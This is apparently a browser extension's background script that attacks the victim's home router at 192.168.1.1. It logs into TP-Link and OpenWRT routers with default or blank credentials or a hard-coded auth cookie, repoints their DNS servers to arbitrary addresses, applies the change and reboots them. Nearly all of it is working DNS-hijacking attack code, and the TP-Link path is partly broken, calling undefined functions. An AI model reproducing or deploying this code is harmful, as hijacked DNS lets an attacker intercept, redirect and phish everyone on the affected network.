//updateExploitState("Hello I am attacking your Wi-Fi router now!", browser);

// Function to get the session ID

// Incoming messages
console.log("Installing onMessage listener")
if (typeof browser !== 'undefined') {
    browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
        console.log(`Received request in background.js ${request.action}`);
        exploitUpdates = "";

        attack_router = "OpenWRT"

        if (attack_router == "TP-Link") {
            let tplinkUpdater = new TPLinkDnsUpdater();
            tplinkUpdater.start(request, sender, sendResponse);
        } else if (attack_router == "OpenWRT") {
            const dnsUpdater = new OpenWRTDnsUpdater(
                "http://192.168.1.1/cgi-bin/luci/",
                "root",
                "",
                "1.1.1.1"
            );

            // Wrap the async method in a Promise
            new Promise((resolve, reject) => {
                dnsUpdater.updateDns()
                    .then(() => {
                        console.log("DNS updated successfully.");
                        resolve({ success: true, log: dnsUpdater.exploitLog });
                    })
                    .catch((error) => {
                        console.log("Error: Error updating DNS:", error);
                        reject({ success: false, lof: dnsUpdater.exploitLog, error: error.message });
                    });
            })
                .then(sendResponse)
                .catch(sendResponse);
        } else {
            console.log("Router not supported")
        }

        // Return true to indicate that sendResponse will be called asynchronously
        return true;
    });
}

//function sendHeadersListener (details) {
//  details.requestHeaders.push({
//      name: "Referer",
//      value: currentReferrer
//  });
//    console.log("Intercepting web requests")
//  return { requestHeaders: details.requestHeaders };
//}
//
//console.log("Installing onBeforeSendHeader")
//browser.webRequest.onBeforeSendHeaders.addListener(
//sendHeadersListener,
//  { urls: [`http://192.168.1.1/*`] },
//  ["blocking", "requestHeaders"]
//);

class TPLinkDnsUpdater {

    constructor() {
        this.baseURL = "http://192.168.1.1"

        this.exploitUpdates = ""

        this.currentReferrer = ""
    }


    connect() {
        const url = this.baseURL;

        return fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.text();
            })
    }

    /**
     * Get the session id after logging in to the TP-Link router
     * @returns {Promise<string>} The session id
     */
    getSessionId() {
        updateExploitState("Logging in.");

        const url = this.baseURL + "/userRpm/LoginRpm.htm?Save=Save";
        const headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"
        };

        console.log(`Connecting to ${url}`);

        return fetch(url, { method: "GET", headers })
            .then(response => {
                if (!response.ok) {
                    updateExploitState(`Request failed: ${response.status}`);
                    return null;
                }
                return response.text().then(responseBody => {
                    console.log(`Response Body: ${responseBody}`);

                    console.log("Response Headers:");
                    for (const [key, value] of response.headers.entries()) {
                        console.log(`${key}: ${value}`);
                    }

                    const sessionIdRegex = /window\.parent\.location\.href = \"http:\/\/192\.168\.1\.1\/([^\/]+)\/userRpm\/Index\.htm/;
                    const match = responseBody.match(sessionIdRegex);

                    if (match) {
                        return match[1];
                    } else {
                        updateExploitState("Session ID not found in the response.");
                        return null;
                    }
                });
            })
            .catch(error => {
                updateExploitState(`An error occurred: ${error}`);
                return null;
            });
    }

    /**
     * This function will loop to get the session ID until it is successful. 
     * @returns {Promise<string>} The session id
     */
    getSessionIdLoopUntilSuccess() {
        return this.getSessionId().then(sessionId => {
            if (sessionId) {
                return sessionId;
            } else {
                return new Promise(resolve => {
                    setTimeout(() => {
                        resolve(this.getSessionIdLoopUntilSuccess());
                    }, 200);
                });
            }
        });
    }

    /**
     * Change the DNS of the router. A valid login sessionid is required
     * @param {string} dns1 - First DNS server
     * @param {string} dns2 - Second DNS server
     * @param {string} sessionId - A valid session id
     */
    changeDNS(dns1, dns2, sessionId) {
        updateExploitState("Changing DNS.");
        const url = new URL(this.baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`);
        console.log(`URL: ${url}`)
        url.searchParams.append("dhcpserver", "1");
        url.searchParams.append("ip1", "192.168.1.100");
        url.searchParams.append("ip2", "192.168.1.199");
        url.searchParams.append("Lease", "120");
        url.searchParams.append("gateway", "192.168.1.1");
        url.searchParams.append("domain", "");
        url.searchParams.append("dnsserver", dns1);
        url.searchParams.append("dnsserver2", dns2);
        url.searchParams.append("Save", "Save");

        currentReferrer = this.baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`

        const headers = {
            "Referer": this.baseURL + `/${sessionId}/userRpm/LanDhcpServerRpm.htm`,
        };

        return fetch(url.toString(), { method: "GET", headers })
            .then(response => {
                if (!response.ok) {
                    console.log(`Request failed: ${response.status}`);
                } else {
                    return response.text().then(responseBody => {
                        console.log(`Response Body ${responseBody}`);
                    });
                }
            })
            .catch(error => {
                updateExploitState(`An error occurred: ${error}`);
            });
    }

    /**
     * Reboot the router after the DNS has been changed, to save the changes. 
     * @param {string} sessionId 
     * @returns 
     */
    rebootRouter(sessionId) {

        updateExploitState("Rebooting router.");
        const url = new URL(this.baseURL + `/${sessionId}/userRpm/SysRebootRpm.htm`);
        url.searchParams.append("Reboot", "Reboot");

        currentReferrer = this.baseURL + `/${sessionId}/userRpm/SysRebootRpm.htm`

        const headers = {
            "Referer": this.baseURL + `/${sessionId}/userRpm/SysRebootRpm.htm`,
        };

        return fetch(url, { method: "GET", headers })
            .then(response => response.text().then(responseBody => {
                console.log(`Response Body: ${responseBody}`);

                if (responseBody.includes("Restarting")) {
                    return true;
                } else {
                    if (!response.ok) {
                        console.log(`Request failed: ${response.status}`);
                    } else {
                        console.log(`Response Body: ${responseBody}`);
                    }
                    return false;
                }
            }))
            .catch(error => {
                console.log(`An error occurred: ${error}`);
                return false;
            });
    }

    updateExploitState(text) {
        console.log(text);
        exploitUpdates = exploitUpdates + text + "<br />";
    }

    setCookie() {
        const authCookie = {
            url: this.baseURL, // The URL for which the cookie is valid
            name: "Authorization", // Cookie name
            value: "Basic YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D", // Cookie value
            path: "/", // Path scope for the cookie
            httpOnly: false, // Set to true if required (usually server-controlled)
            sameSite: "no_restriction", // Allow cross-site usage if necessary
            secure: false // Set true for HTTPS-only; adjust based on your server
        };

        // Set the cookie using the extension API
        return browser.cookies.set(authCookie)
    }

    start(request, sender, sendResponse) {
        setCookie()
            .then(cookie => {
                console.log("Cookie set successfully:", cookie);
                connect().then(() => {
                    this.getSessionIdLoopUntilSuccess()
                        .then(sessionId => {
                            if (sessionId) {
                                updateExploitState("Session ID:", sessionId);
                                return changeDNS("111.111.111.111", "222.222.222.222", sessionId).then(() => {
                                    updateExploitState("DNS changed. Awaiting reboot.");
                                    updateExploitState("Rebooting now.");
                                    return rebootRouter(sessionId).then(restarting => {
                                        if (!restarting) {
                                            return rebootRouter(sessionId);
                                        }
                                        return restarting;
                                    });
                                });
                            } else {
                                updateExploitState("Session ID not found.");
                                return Promise.reject("Session ID not found.");
                            }
                        })
                        .then(restarting => {
                            if (restarting) {
                                updateExploitState("Done.");
                                sendResponse({ success: true, log: exploitUpdates });
                            } else {
                                updateExploitState("Reboot failed.");
                                sendResponse({ success: false, log: exploitUpdates });
                            }
                        })
                        .catch(error => {
                            updateExploitState(`Error: ${error}`);
                            sendResponse({ success: false, log: exploitUpdates });
                        })
                })
                    .catch(error => {
                        updateExploitState(`Error: ${error}`);
                        sendResponse({ success: false, log: exploitUpdates });
                    });
            })
            .catch(error => {
                this.log("Error: Failed to set cookie:", error);
                updateExploitState(`Failed to set cookie ${error}`);

                sendResponse({ success: false, log: exploitUpdates });
            });
    }
}

/**
 * A class to update the DNS settings on an OpenWRT router.
 */
class OpenWRTDnsUpdater {
    constructor(routerUrl, username, password, dnsServer) {
        this.routerUrl = routerUrl;
        this.username = username;
        this.password = password;
        this.dnsServer = dnsServer;
        this.sysauthHttp = "";
        this.token = "";
        this.exploitLog = ""
        console.log(`Connecting to ${routerUrl}, username ${username}, password ${password}`)
    }

    log(message) {
        console.log(message);
        this.exploitLog += message + "<br />";
    }

    async loginUbus() {
        let jsonBody = `{ "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["00000000000000000000000000000000", "session", "login", { "username": "root", "password": "" }] }`

        var response = await fetch("http://192.168.1.1/ubus", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: jsonBody,
            credentials: "include",  // Ensures cookies are handled
            redirect: "follow" // Handle redirects manually 
        });

        const responseBody = await response.text();
        let sessionIdMatch = responseBody.match(/"ubus_rpc_session":\s*"([^"]+)"/);
        this.sysauthHttp = sessionIdMatch ? sessionIdMatch[1] : null;
        
        if (this.sysauthHttp) {
            this.log("Login successful. Token and session obtained.");
            return true;
        } else {
            this.log("Error: Failed to obtain session or token.");
            return false;
        }
    }

    /**
     * Change the DNS settings on the router
     */
    async changeDns() {
        const payload = JSON.stringify([
            {
                "jsonrpc": "2.0",
                "id": 60,
                "method": "call",
                "params": [
                    this.sysauthHttp,
                    "uci",
                    "set",
                    {
                        "config": "dhcp",
                        "section": "wan",
                        "values": { "ignore": "1" }
                    }
                ]
            },
            {
                "jsonrpc": "2.0",
                "id": 61,
                "method": "call",
                "params": [
                    this.sysauthHttp,
                    "uci",
                    "set",
                    {
                        "config": "network",
                        "section": "wan",
                        "values": {
                            "peerdns": "0",
                            "dns": [this.dnsServer]
                        }
                    }
                ]
            }
        ]);

        const response = await fetch("http://192.168.1.1/ubus/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: payload
        });

        if (response.ok) {
            this.log("DNS settings changed successfully.");
        } else {
            this.log("Error: Failed to change DNS settings.");
        }
    }

    async applyChangesUbus() {
        let jsonBody = `{ "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["${this.sysauthHttp}", "uci", "apply", { "rollback": false }] }`

        var response = await fetch("http://192.168.1.1/ubus", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: jsonBody,
            credentials: "include",  // Ensures cookies are handled
            redirect: "follow" // Handle redirects manually 
        });

        if (response.ok) {
            this.log("Changes applied successfully.");
        } else {
            this.log("Error: Failed to apply changes.");
        }
    }

    async rebootUbus() {
        let jsonBody = `{ "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["${this.sysauthHttp}", "system", "reboot", {}] }`

        var response = await fetch("http://192.168.1.1/ubus", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: jsonBody,
            credentials: "include",  // Ensures cookies are handled
            redirect: "follow" // Handle redirects manually 
        });

        if (response.ok) {
            this.log("Rebooting router.");
        } else {
            this.log("Error: Failed to rebooting router.");
        }
    }

    async updateDns() {
        const loggedIn = await this.loginUbus();
        // const loggedIn = await this.login();
        if (loggedIn) {
            await this.changeDns();
            await this.applyChangesUbus();
            await this.rebootUbus(); 
        }
    }

    setCookie() {

        const authCookie = {
            url: "http://192.168.1.1", // The URL for which the cookie is valid
            name: "sysauth_http", // Cookie name
            value: this.sysauthHttp, // Cookie value
            path: "/", // Path scope for the cookie
            httpOnly: false, // Set to true if required (usually server-controlled)
            sameSite: "no_restriction", // Allow cross-site usage if necessary
            secure: false // Set true for HTTPS-only; adjust based on your server
        };

        // Set the cookie using the extension API
        if (typeof browser !== 'undefined') {
            return browser.cookies.set(authCookie)
        } else {
            return true
        }

    }
}

// For running the script directly for testing. 
if (typeof browser === "undefined") {
    // Example usage
    const dnsUpdater = new OpenWRTDnsUpdater(
        "http://192.168.1.1/cgi-bin/luci/",
        "root",
        "",
        "6.6.6.6"
    );

    dnsUpdater.updateDns();
}
